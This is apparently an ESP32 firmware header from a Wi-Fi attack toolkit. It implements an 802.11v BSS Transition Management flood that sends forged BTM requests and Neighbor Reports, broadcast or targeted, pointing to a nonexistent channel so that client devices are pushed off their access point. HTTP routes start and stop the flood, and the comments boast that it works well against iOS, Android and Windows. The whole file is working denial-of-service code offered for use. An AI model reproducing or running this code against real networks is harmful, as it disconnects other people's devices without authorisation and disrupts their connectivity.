#pragma once
#include <WiFi.h>
#include <esp_wifi.h>
#include "frames.h"
#include "module.h"
#include "safety.h"

// BSS Transition Management (802.11v) flood
// Sends BTM requests to STA, forcing it to roam away from the AP.
// Very effective against iOS, Android, Windows — all honour BTM requests.
// Also sends Neighbor Report to confuse roaming decisions.
static bool btm_running = false;
static uint8_t btm_ap[6] = {};
static uint8_t btm_sta[6] = {};
static uint8_t btm_ch = 6;
static uint8_t btm_target_ch = 14;  // fake/nonexistent channel
static bool btm_bcast = true;
static volatile uint32_t btm_sent = 0;
static uint8_t btm_mode = 0;  // 0=BTM req, 1=Neighbor, 2=Both
static TaskHandle_t btm_task = nullptr;

static void btm_run(void *) {
  uint8_t f[64];
  btm_sent = 0;
  while (btm_running) {
    if (!safety_rate_ok(1)) {
      vTaskDelay(pdMS_TO_TICKS(50));
      continue;
    }
    const uint8_t *dst = btm_bcast ? BC : btm_sta;
    size_t n = 0;
    if (btm_mode == 0 || btm_mode == 2) {
      n = f_actionBTM(f, dst, btm_ap, btm_target_ch);
      esp_wifi_80211_tx(WIFI_IF_AP, f, n, false);
      btm_sent++;
    }
    if (btm_mode == 1 || btm_mode == 2) {
      n = f_actionNeighbor(f, dst, btm_ap, btm_target_ch);
      esp_wifi_80211_tx(WIFI_IF_AP, f, n, false);
      btm_sent++;
    }
    vTaskDelay(pdMS_TO_TICKS(8));
  }
  btm_task = nullptr;
  vTaskDelete(nullptr);
}

static bool btm_start(const String &q) {
  int i;
  String bs, ss, ch, tc, mo, bc;
  if ((i = q.indexOf("bssid=")) >= 0) {
    int e = q.indexOf('&', i);
    bs = q.substring(i + 6, e < 0 ? q.length() : e);
  }
  if ((i = q.indexOf("sta=")) >= 0) {
    int e = q.indexOf('&', i);
    ss = q.substring(i + 4, e < 0 ? q.length() : e);
  }
  if ((i = q.indexOf("ch=")) >= 0) {
    int e = q.indexOf('&', i);
    ch = q.substring(i + 3, e < 0 ? q.length() : e);
  }
  if ((i = q.indexOf("target_ch=")) >= 0) {
    int e = q.indexOf('&', i);
    tc = q.substring(i + 10, e < 0 ? q.length() : e);
  }
  if ((i = q.indexOf("mode=")) >= 0) {
    int e = q.indexOf('&', i);
    mo = q.substring(i + 5, e < 0 ? q.length() : e);
  }
  if ((i = q.indexOf("broadcast=")) >= 0) {
    int e = q.indexOf('&', i);
    bc = q.substring(i + 10, e < 0 ? q.length() : e);
  }
  if (bs.length() != 17)
    return false;
  sscanf(bs.c_str(), "%x:%x:%x:%x:%x:%x", (unsigned *)&btm_ap[0], (unsigned *)&btm_ap[1],
         (unsigned *)&btm_ap[2], (unsigned *)&btm_ap[3], (unsigned *)&btm_ap[4],
         (unsigned *)&btm_ap[5]);
  if (ss.length() == 17)
    sscanf(ss.c_str(), "%x:%x:%x:%x:%x:%x", (unsigned *)&btm_sta[0], (unsigned *)&btm_sta[1],
           (unsigned *)&btm_sta[2], (unsigned *)&btm_sta[3], (unsigned *)&btm_sta[4],
           (unsigned *)&btm_sta[5]);
  btm_ch = ch.toInt();
  if (!btm_ch)
    btm_ch = 6;
  btm_target_ch = tc.toInt();
  if (!btm_target_ch)
    btm_target_ch = 14;
  btm_bcast = (bc != "0");
  if (mo == "neighbor")
    btm_mode = 1;
  else if (mo == "both")
    btm_mode = 2;
  else
    btm_mode = 0;
  esp_wifi_set_channel(btm_ch, WIFI_SECOND_CHAN_NONE);
  btm_running = true;
  xTaskCreate(btm_run, "btm_run", 4096, nullptr, 5, &btm_task);
  return true;
}
static void btm_stop() {
  btm_running = false;
}
static void btm_routes() {
  extern WebServer server;
  server.on("/api/btmflood/start", HTTP_POST, []() {
    String q;
    for (int i = 0; i < server.args(); i++) {
      if (i)
        q += '&';
      q += server.argName(i) + '=' + server.arg(i);
    }
    bool ok = tool_start("btmflood", q);
    server.send(200, "application/json", ok ? "{\"ok\":1}" : "{\"ok\":0,\"err\":\"busy\"}");
  });
  server.on("/api/btmflood/stop", HTTP_POST, []() {
    tool_stop("btmflood");
    server.send(200, "application/json", "{\"ok\":1}");
  });
  server.on("/api/btmflood/status", HTTP_GET, []() {
    server.send(200, "application/json",
                "{\"running\":" + String(btm_running ? 1 : 0) + ",\"sent\":" + String(btm_sent) +
                    ",\"msg\":\"" + String(btm_sent) + " BTM frames sent\"}");
  });
}
